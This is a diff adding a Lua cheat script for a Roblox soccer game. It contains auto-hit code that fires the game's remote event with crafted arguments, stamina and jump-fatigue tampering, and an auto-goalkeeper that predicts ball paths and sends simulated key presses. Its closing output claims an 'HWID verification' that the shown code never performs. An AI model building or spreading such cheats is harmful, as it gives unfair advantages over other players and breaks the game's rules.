+    local closestBall = getClosestBall(playerPos)
+    if not closestBall then return end
+    local distanceToBall = (closestBall.Position - playerPos).Magnitude
+    if distanceToBall > hitboxRadius then return end
+    local direction = getMoveDirection()
+    canFire = false
+    local args = {
+        [1] = direction,
+        [2] = CFrame.new(playerPos, closestBall.Position),
+        [3] = closestBall.Position,
+        [4] = 32.4,
+        [5] = false
+    }
+    pcall(function()
+        player.Character.CharacterHandler.Remotes.LeftClick:FireServer(unpack(args))
+    end)
+    delay(0.1,function() canFire = true end)
+end
+
+spawn(function()
+    while true do
+        wait(0.05)
+        if isHoldMode and isM1Down then
+            fireLeftClick()
+        end
+    end
+end)
+
+Toggles.AutoFlick:OnChanged(function()
+    autoFlick = Toggles.AutoFlick.Value
+end)
+
+Tab3:AddLabel('Keybind'):AddKeyPicker('KeyPicker', {
+    Default = 'Z',
+    SyncToggleState = false,
+    Mode = 'Toggle',
+    Text = 'allah',
+    NoUI = false,
+    Callback = function(Value)
+        if autoFlick then
+            fireRiptideAndKick()
+        end
+    end,
+})
+
+local stamxego = Tabs.Main:AddRightTabbox() 
+local tabidk = stamxego:AddTab('Stamina')
+
+tabidk:AddSlider('MaxStam', {
+    Text = 'Maximum Stamina',
+    Default = 0,
+    Min = 100,
+    Max = 7000,
+    Rounding = 3,
+    Compact = false,
+    Callback = function(Value)
+        local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local stamina = character:FindFirstChild("Stamina")
+        if stamina and stamina:IsA("NumberValue") then
+            stamina:SetAttribute("Max", Value)
+        else
+            warn("Stamina NumberValue bulunamadı!")
+        end
+    end
+})
+
+
+
+local stamina = tabidk:AddButton({
+    Text = 'Set Stamina Full',
+    Func = function()
+        local player = game:GetService("Players").LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoid = character:WaitForChild("Humanoid")
+
+        local accessory = Instance.new("Accessory")
+        accessory.Name = "FullStamina"
+
+        local handle = Instance.new("Part")
+        handle.Name = "Handle"
+        handle.Size = Vector3.new(1,1,1)
+        handle.Color = Color3.fromRGB(0,255,0)
+        handle.Anchored = false
+        handle.CanCollide = false
+        handle.Parent = accessory
+
+        local attachment = Instance.new("Attachment")
+        attachment.Name = "HatAttachment"
+        attachment.Parent = handle
+
+        accessory.Parent = character
+        humanoid:AddAccessory(accessory)
+    end,
+    DoubleClick = false
+})
+
+local TabBox = Tabs.Main:AddLeftTabbox() 
+
+-- Separate Auto Form and Fatigue/Cooldown UI + logic
+local function setupAutoForm()
+    local Tab1 = TabBox:AddTab('Auto Form')
+    Tab1:AddToggle('AutoForm', { Text = 'Toggle' })
+
+    Toggles.AutoForm:OnChanged(function()
+        autoForm = Toggles.AutoForm.Value
+    end)
+end
+
+local function setupFatigueCooldown()
+    local Tab2 = TabBox:AddTab('Fatigue & Cooldown')
+
+    Tab2:AddToggle('NoJumpFatigue', { Text = 'NoJump Fatigue' })
+    Toggles.NoJumpFatigue:OnChanged(function()
+        noJumpFatigue = Toggles.NoJumpFatigue.Value
+    end)
+
+    Tab2:AddToggle('NoJumpCooldown', { Text = 'NoJump Cooldown' })
+    Toggles.NoJumpCooldown:OnChanged(function()
+        noJumpCooldown = Toggles.NoJumpCooldown.Value
+    end)
+
+    local runService = game:GetService("RunService")
+
+    task.spawn(function()
+        while true do
+            task.wait(0.1)
+            if not (noJumpFatigue or noJumpCooldown) then
+                continue
+            end
+            local char = player.Character
+            if not char then
+                continue
+            end
+            local hum = char:FindFirstChildOfClass("Humanoid")
+            if not hum then
+                continue
+            end
+            if noJumpFatigue then
+                local jf = char:FindFirstChild("JumpFatigue")
+                if jf then
+                    jf:Destroy()
+                end
+            end
+            if noJumpCooldown then
+                hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+                if hum:GetState() == Enum.HumanoidStateType.Landed then
+                    hum:ChangeState(Enum.HumanoidStateType.Running)
+                end
+                if hum.Jump then
+                    hum.Jump = false
+                end
+            end
+        end
+    end)
+end
+
+-- Initialize separated UI/logic
+setupAutoForm()
+setupFatigueCooldown()
+
+-- ========================================
+-- === AUTO GK TAB ===
+-- ========================================
+
+local VirtualInputManager = game:GetService("VirtualInputManager")
+
+-- Auto GK Variables
+local gravity = workspace.Gravity or 196.2
+local timeStep = 0.004
+local pathPointSize = 0.3
+local GROUND_Y = 0.5
+local BOUNCE_COEFFICIENT = 0.3
+local FRICTION_COEFFICIENT = 0.85
+local MIN_BOUNCE_VELOCITY = 3
+local ENABLE_BOUNCE_SIMULATION = true
+local SHOW_TRAJECTORY = false
+
+-- GOAL DEFINITIONS
+local leftGoalCFrame = CFrame.new(369.352325, 6.99591351, 0.340681076) * CFrame.Angles(0, math.rad(90), 0)
+local leftGoalSize = Vector3.new(40.875736236572266, 16.916915893554688, 20.223739624023438)
+local leftGoalFrontCFrame = leftGoalCFrame + (leftGoalCFrame.LookVector * (leftGoalSize.Z / 2))
+
+local rightGoalCFrame = CFrame.new(-369.789307, 6.99591255, 0.313301444) * CFrame.Angles(0, math.rad(-90), 0)
+local rightGoalSize = Vector3.new(40.875736236572266, 16.916915893554688, 20.223739624023438)
+local rightGoalFrontCFrame = rightGoalCFrame + (rightGoalCFrame.LookVector * (rightGoalSize.Z / 2))
+
+-- WAIT FOR BALLS FOLDER
+local ballsFolder
+repeat
+    ballsFolder = Workspace:FindFirstChild("Balls")
+    RunService.RenderStepped:Wait()
+until ballsFolder
+
+-- Auto GK Script Variables
+local autodiveEnabled = false
+local instantModeEnabled = false
+local holdMode = true
+local diveOffset = 0.55
+local middleTolerance = 4.7
+local jumpHeightThreshold = 4.8
+local activePlan = nil
+
+-- Keybind variables
+local autodiveKey = Enum.KeyCode.U
+local instantKey = Enum.KeyCode.T
+local toggleModeKey = Enum.KeyCode.P
+
+-- Helper Functions for Auto GK
+local function checkLineIntersectsGoal(pos1, pos2, goalCFrame, goalSize)
+    local p1 = goalCFrame:PointToObjectSpace(pos1)
+    local p2 = goalCFrame:PointToObjectSpace(pos2)
+
+    if (p1.Z > 0 and p2.Z < 0) or (p1.Z < 0 and p2.Z > 0) then
+        local t = p1.Z / (p1.Z - p2.Z)
+        local ix = p1.X + t * (p2.X - p1.X)
+        local iy = p1.Y + t * (p2.Y - p1.Y)
+        if math.abs(ix) <= goalSize.X/2 and math.abs(iy) <= goalSize.Y/2 then
+            return true, Vector3.new(ix, iy, 0)
+        end
+    end
+
+    return false, nil
+end
+
+local function predictGoalHit(ballPos, ballVel)
+    local currentPos, currentVel = ballPos, ballVel
+    local currentTime = 0
+    local prevPos = ballPos
+    local maxTime = 2
+    local bounceDetected = false
+
+    local adaptiveTimeStep = timeStep
+    if ballVel.Magnitude > 200 then
+        adaptiveTimeStep = 0.0004
+    end
+
+    while currentTime < maxTime do
+        currentTime = currentTime + adaptiveTimeStep
+
+        local accel = Vector3.new(0, -gravity, 0)
+        local nextVel = currentVel + accel * adaptiveTimeStep
+        local avgVel = (currentVel + nextVel) * 0.5
+        local nextPos = currentPos + avgVel * adaptiveTimeStep
+
+        if ENABLE_BOUNCE_SIMULATION and nextPos.Y <= GROUND_Y and currentVel.Y < 0 then
+            bounceDetected = true
+
+            local a = -0.5 * gravity
+            local b = currentVel.Y
+            local c = currentPos.Y - GROUND_Y
+            local disc = b*b - 4*a*c
+
+            if disc >= 0 then
+                local t = (-b - math.sqrt(disc)) / (2*a)
+                t = math.clamp(t, 0, adaptiveTimeStep)
+
+                local groundVel = currentVel + Vector3.new(0, -gravity*t, 0)
+                local groundPos = currentPos + currentVel*t + Vector3.new(0, -0.5*gravity*t*t, 0)
+                groundPos = Vector3.new(groundPos.X, GROUND_Y, groundPos.Z)
+
+                nextVel = Vector3.new(
+                    groundVel.X * FRICTION_COEFFICIENT,
+                    -groundVel.Y * BOUNCE_COEFFICIENT,
+                    groundVel.Z * FRICTION_COEFFICIENT
+                )
+
+                nextPos = groundPos
+
+                if math.abs(nextVel.Y) < MIN_BOUNCE_VELOCITY then
+                    break
+                end
+            end
+        end
+
+        if nextPos.Y < -20 then break end
+
+        local hitL, localHitL = checkLineIntersectsGoal(prevPos, nextPos, leftGoalFrontCFrame, leftGoalSize)
+        if hitL then
+            return currentTime, leftGoalFrontCFrame:PointToWorldSpace(localHitL), "LEFT",
+                bounceDetected, leftGoalFrontCFrame, localHitL
+        end
+
+        local hitR, localHitR = checkLineIntersectsGoal(prevPos, nextPos, rightGoalFrontCFrame, rightGoalSize)
+        if hitR then
+            return currentTime, rightGoalFrontCFrame:PointToWorldSpace(localHitR), "RIGHT",
+                bounceDetected, rightGoalFrontCFrame, localHitR
+        end
+
+        prevPos = currentPos
+        currentPos = nextPos
+        currentVel = nextVel
+    end
+
+    return nil, nil, nil, false, nil, nil
+end
+
+local function sendKey(key)
+    pcall(function()
+        VirtualInputManager:SendKeyEvent(true, key, false, game)
+        RunService.RenderStepped:Wait()
+        VirtualInputManager:SendKeyEvent(false, key, false, game)
+    end)
+end
+
+local function pressKeyOnce(name)
+    local key = Enum.KeyCode[name] or name
+    sendKey(key)
+end
+
+local function getKeeperRoot()
+    local char = player.Character
+    if not char then return nil end
+    return char:FindFirstChild("HumanoidRootPart") or
+           char:FindFirstChild("Torso") or
+           char:FindFirstChild("UpperTorso")
+end
+
+local function chooseDive(goalFrontCFrame, localHitPos, keeperPos)
+    local keeperLocal = goalFrontCFrame:PointToObjectSpace(keeperPos)
+    local dx = localHitPos.X - keeperLocal.X
+
+    if math.abs(dx) <= middleTolerance then
+        return "MIDDLE"
+    end
+    if dx > 0 then return "RIGHT" else return "LEFT" end
+end
+
+local function performDive(dir, jump)
+    if jump then 
+        pressKeyOnce("Space")
+    end
+    
+    if dir == "LEFT" then
+        pressKeyOnce("X")
+    elseif dir == "RIGHT" then
+        pressKeyOnce("C")
+    else
+        pressKeyOnce("F")
+    end
+end
+
+local function clearActivePlan()
+    activePlan = nil
+end
+
+-- Create Auto GK UI
+local GKLeftBox = Tabs.AutoGK:AddLeftGroupbox('Settings')
+
+GKLeftBox:AddSlider('GK_DiveOffset', {
+    Text = 'Dive Offset',
+    Default = 0.55,
+    Min = 0,
+    Max = 1,
+    Rounding = 2,
+    Compact = false,
+    Suffix = 's',
+    Callback = function(Value)
+        diveOffset = Value
+    end
+})
+
+GKLeftBox:AddSlider('GK_MiddleTolerance', {
+    Text = 'Middle Tolerance',
+    Default = 4.7,
+    Min = 0.1,
+    Max = 20,
+    Rounding = 1,
+    Compact = false,
+    Callback = function(Value)
+        middleTolerance = Value
+    end
+})
+
+GKLeftBox:AddLabel('Jump Height: 4.8 (FIXED)')
+
+local GKControlsBox = Tabs.AutoGK:AddLeftGroupbox('Controls')
+
+GKControlsBox:AddToggle('GK_Autodive', { 
+    Text = 'Enable Autodive',
+    Default = false
+})
+
+Toggles.GK_Autodive:OnChanged(function()
+    if not holdMode then
+        autodiveEnabled = Toggles.GK_Autodive.Value
+    end
+end)
+
+GKControlsBox:AddToggle('GK_ModeToggle', { 
+    Text = 'Toggle Mode (OFF = HOLD)',
+    Default = false
+})
+
+Toggles.GK_ModeToggle:OnChanged(function()
+    holdMode = not Toggles.GK_ModeToggle.Value
+    if holdMode then
+        autodiveEnabled = false
+        Toggles.GK_Autodive:SetValue(false)
+    end
+end)
+
+local GKStatusBox = Tabs.AutoGK:AddRightGroupbox('Status')
+
+local predictionLabel = GKStatusBox:AddLabel('Prediction: --')
+local statusLabel = GKStatusBox:AddLabel('Status: Waiting...')
+local timingLabel = GKStatusBox:AddLabel('Timing: --')
+local modeLabel = GKStatusBox:AddLabel('Mode: HOLD (Press P)')
+
+local GKKeybindsBox = Tabs.AutoGK:AddRightGroupbox('Keybinds')
+
+GKKeybindsBox:AddLabel('Autodive Key'):AddKeyPicker('GK_AutodiveKey', {
+    Default = 'U',
+    SyncToggleState = false,
+    Mode = 'Toggle',
+    Text = 'Autodive',
+    NoUI = false,
+    Callback = function(Value)
+        autodiveKey = Enum.KeyCode[Value]
+    end,
+})
+
+GKKeybindsBox:AddLabel('Instant Mode Key'):AddKeyPicker('GK_InstantKey', {
+    Default = 'T',
+    SyncToggleState = false,
+    Mode = 'Toggle',
+    Text = 'Instant',
+    NoUI = false,
+    Callback = function(Value)
+        instantKey = Enum.KeyCode[Value]
+    end,
+})
+
+GKKeybindsBox:AddLabel('Toggle Mode Key'):AddKeyPicker('GK_ToggleModeKey', {
+    Default = 'P',
+    SyncToggleState = false,
+    Mode = 'Toggle',
+    Text = 'Toggle Mode',
+    NoUI = false,
+    Callback = function(Value)
+        toggleModeKey = Enum.KeyCode[Value]
+    end,
+})
+
+-- Main Auto GK Loop
+RunService.RenderStepped:Connect(function()
+    local keeperRoot = getKeeperRoot()
+    if not keeperRoot then
+        predictionLabel:SetText('Prediction: --')
+        statusLabel:SetText('Status: Waiting for keeper...')
+        clearActivePlan()
+        return
+    end
+
+    instantModeEnabled = UserInputService:IsKeyDown(instantKey)
+
+    if holdMode then
+        autodiveEnabled = UserInputService:IsKeyDown(autodiveKey)
+    end
+    
+    modeLabel:SetText("Mode: " .. (holdMode and "HOLD" or "TOGGLE") .. " (Press P)")
+
+    local bestBall = nil
+    local bestMag = 0
+
+    for _, ball in ipairs(ballsFolder:GetChildren()) do
+        if ball:IsA("BasePart") then
+            local vel = ball.AssemblyLinearVelocity or ball.Velocity
+            local speed = vel.Magnitude
+            if speed > bestMag then
+                bestMag = speed
+                bestBall = ball
+            end
+        end
+    end
+
+    if not bestBall then
+        predictionLabel:SetText('Prediction: --')
+        statusLabel:SetText('Status: No balls.')
+        timingLabel:SetText('Timing: --')
+        clearActivePlan()
+        return
+    end
+
+    local ballPos = bestBall.Position
+    local ballVel = bestBall.AssemblyLinearVelocity or bestBall.Velocity
+
+    local hitTime, hitPos, goalSide, bounced, goalFront, localHit = predictGoalHit(ballPos, ballVel)
+
+    if not hitTime then
+        predictionLabel:SetText('Prediction: --')
+        statusLabel:SetText('Status: No goal impact.')
+        timingLabel:SetText('Timing: --')
+        clearActivePlan()
+        return
+    end
+
+    predictionLabel:SetText(string.format("Prediction: %s | %.2fs | Y=%.1f", goalSide, hitTime, hitPos.Y))
+    statusLabel:SetText(string.format("X: %.1f", localHit.X))
+
+    local diveDir = chooseDive(goalFront, localHit, keeperRoot.Position)
+    local shouldJump = hitPos.Y >= jumpHeightThreshold
+
+    local diveTriggerTime = hitTime - diveOffset
+    if diveTriggerTime < 0 then diveTriggerTime = 0 end
+
+    activePlan = {
+        triggerTime = tick() + diveTriggerTime,
+        diveDir = diveDir,
+        shouldJump = shouldJump,
+        plannedBall = bestBall
+    }
+
+    local actionDesc = string.format("%s%s", diveDir, shouldJump and ", JUMP" or "")
+    timingLabel:SetText(string.format("Timing: in %.2fs (%s)", diveTriggerTime, actionDesc))
+end)
+
+RunService.RenderStepped:Connect(function()
+    if instantModeEnabled then
+        local keeperRoot = getKeeperRoot()
+        if not keeperRoot then return end
+        
+        local bestBall = nil
+        local bestMag = 0
+        for _, ball in ipairs(ballsFolder:GetChildren()) do
+            if ball:IsA("BasePart") then
+                local vel = ball.AssemblyLinearVelocity or ball.Velocity
+                local speed = vel.Magnitude
+                if speed > bestMag then
+                    bestMag = speed
+                    bestBall = ball
+                end
+            end
+        end
+        
+        if bestBall then
+            local ballPos = bestBall.Position
+            local ballVel = bestBall.AssemblyLinearVelocity or bestBall.Velocity
+            
+            local originalTimeStep = timeStep
+            timeStep = 0.00005
+            
+            local hitTime, hitPos, goalSide, bounced, goalFront, localHit = predictGoalHit(ballPos, ballVel)
+            
+            timeStep = originalTimeStep
+            
+            if hitTime and hitTime > 0.02 then
+                local diveDir = chooseDive(goalFront, localHit, keeperRoot.Position)
+                local shouldJump = hitPos.Y >= jumpHeightThreshold
+                
+                performDive(diveDir, shouldJump)
+                
+                local actionDesc = string.format("%s%s", diveDir, shouldJump and ", JUMP" or "")
+                timingLabel:SetText(string.format("INSTANT EXECUTED! (%s)", actionDesc))
+                clearActivePlan()
+                task.wait(0.1)
+                return
+            end
+        end
+    end
+    
+    if not activePlan then return end
+    local now = tick()
+    if autodiveEnabled and now >= activePlan.triggerTime then
+        performDive(activePlan.diveDir, activePlan.shouldJump)
+        
+        local actionDesc = string.format("%s%s", activePlan.diveDir, activePlan.shouldJump and ", JUMP" or "")
+        timingLabel:SetText(string.format("EXECUTED! (%s)", actionDesc))
+        clearActivePlan()
+    end
+end)
+
+UserInputService.InputBegan:Connect(function(key, gp)
+    if gp then return end
+    
+    if key.KeyCode == autodiveKey then
+        if not holdMode then
+            autodiveEnabled = not autodiveEnabled
+            Toggles.GK_Autodive:SetValue(autodiveEnabled)
+        end
+    end
+    
+    if key.KeyCode == toggleModeKey then
+        holdMode = not holdMode
+        if holdMode then
+            autodiveEnabled = false
+            Toggles.GK_Autodive:SetValue(false)
+        end
+        Toggles.GK_ModeToggle:SetValue(not holdMode)
+        modeLabel:SetText("Mode: " .. (holdMode and "HOLD" or "TOGGLE") .. " (Press P)")
+    end
+end)
+
+
+-- ========================================
+-- === UI SETTINGS ===
+-- ========================================
+Library:OnUnload(function()
+    Library.Unloaded = true
+end)
+
+local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
+
+MenuGroup:AddButton('Unload', function() Library:Unload() end)
+MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' })
+
+Library.ToggleKeybind = Options.MenuKeybind
+
+ThemeManager:SetLibrary(Library)
+SaveManager:SetLibrary(Library)
+SaveManager:IgnoreThemeSettings()
+SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
+ThemeManager:SetFolder('MyScriptHub')
+SaveManager:SetFolder('MyScriptHub/specific-game')
+SaveManager:BuildConfigSection(Tabs['UI Settings'])
+ThemeManager:ApplyToTab(Tabs['UI Settings'])
+SaveManager:LoadAutoloadConfig()
+
+print("✅ Merged script loaded successfully!")
+print("🔐 HWID verification complete")
+print("⚽ All features enabled")
